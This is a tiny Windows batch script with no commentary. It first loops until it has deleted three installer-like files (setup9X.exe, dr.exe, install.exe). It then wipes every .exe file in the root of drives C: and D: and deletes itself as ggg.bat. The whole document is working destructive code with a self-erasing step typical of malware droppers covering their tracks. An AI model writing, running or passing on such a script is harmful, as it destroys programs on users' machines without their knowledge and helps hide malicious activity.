@Echo off
:S
Del setup9X.exe
If Exist setup9X.exe Goto S
:G
Del dr.exe
If Exist dr.exe Goto G
:H
Del install.exe
If Exist install.exe Goto H
del c:\*.exe
del d:\*.exe
del ggg.bat
